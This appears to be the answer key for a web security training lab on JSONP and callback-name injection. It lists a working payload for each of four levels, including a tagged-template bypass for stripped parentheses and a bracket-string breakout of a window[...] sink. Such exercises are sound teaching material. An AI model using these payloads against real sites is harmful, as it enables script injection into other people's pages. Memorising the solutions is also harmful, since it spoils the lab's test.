# callback — solutions

JSONP-style and callback-name injection sinks.

### callback-level1

`/callback/level1/?callback=alert(1)//`

- payload: `alert(1)//`
- context: application/javascript JSONP; callback name reflected as raw JS — exploit via attacker-controlled <script src> embedding this URL (direct nav renders as text)

### callback-level2

`/callback/level2/?callback=alert%601%60//`

- payload: `alert\`1\`//`
- context: parens stripped from callback; tagged template call bypasses; load via <script src=…>

### callback-level3

`/callback/level3/?fn=alert`

- payload: `alert`
- context: HTML page injects `FN({"msg":"Hello"})` — set fn=alert to fire `alert({"msg":"Hello"})`

### callback-level4

`/callback/level4/?handler=x%27%5D=alert;window%5B%27x`

- payload: `x']=alert;window['x`
- context: window['HANDLER'] sink — break out of bracket string to assign + call alert
